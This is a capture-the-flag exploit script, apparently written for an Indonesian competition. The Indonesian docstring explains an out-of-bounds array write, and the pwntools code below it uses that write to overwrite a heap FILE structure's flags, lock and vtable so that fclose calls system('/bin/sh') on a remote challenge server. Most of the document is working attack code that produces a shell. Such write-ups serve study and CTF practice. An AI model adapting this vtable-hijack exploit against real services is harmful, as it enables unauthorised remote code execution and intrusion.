"""
Vuln terdapat pada fungsi readNum dimana saat array dimasukan nilai, index tidak dicek sehingga menyebabkan Out of Boundary.
Jika kita perhatikan pada bagian heap, array num_arr tepat berada di atas struktur FILE.

### Exploit ###
Kita bisa mengeksploitasi struktur FILE dengan mengoverwrite vtable dan _flag dengan address sistem dan string "/bin/sh"
untuk memanggil remote shell. Karena libc yang digunakan 2.23, maka tidak ada pengecekan pada vtable.

Pada _IO_file_close_it+282 terdapat call QWORD PTR [rax+0x88] dimana rax merupakan pointer vtable dengan rdi (&_flag) sebagai argumen pertama.
Karena kita akan memanggil system, kita bisa mengoverwrite vtable dengan address GOT system-0x88 atau 0x403f00.
_flag dapat dioverwrite dengan string "/bin/sh"
pada fungsi fclose, sebelum memanggil _IO_file_close_it terdapat pengecekan pada fp->_lock (offset 0x88)
yang hanya perlu diarahkan ke writeable address agar tidak segmentation fault

https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique
"""

from pwn import *
from math import sqrt

r = remote('ctf.joints.id', 17074)

def getPrimeFactor(n):
    t = ''
    while(n%2 == 0):
        t += '2 '
        n /= 2
    kk = int(sqrt(n)) + 1
    for k in range(3, kk, 2):
        while(n%k == 0):
            t += str(k) + ' '
            n /= k
    if(n > 2):
        t += str(n) + ' '
    return t[:-1]

# Kita akan overwrite struktur file stream saat iterasi terakhir
r.recvuntil("!\n")
for i in range(99):
    n = int(r.recvline()[:-1])
    r.sendlineafter("> ", getPrimeFactor(n))

n = int(r.recvline()[:-1])
t = getPrimeFactor(n).split(' ')
t += ['0']*(20-len(t)) # padding

# fp->_flag = "/bin/sh" (+0x00)
# fp->_vtabel = GOT_system-0x88 (+0xd8)
# fp->_lock = writeable address (+0x88)
t += ['1852400175'] # _flags (/bin/sh) 0
t += ['6845231'] #                     1
t += ['0']*32 # padding                2-33
t += [str(0x4040f0)] # _lock           34
t += ['0']*19 # padding                35-53
t += [str(0x403f00)] # _vtabel         54
t += ['0']

r.sendlineafter("> ", ' '.join(t))
r.sendlineafter("> ", '6')
r.interactive()
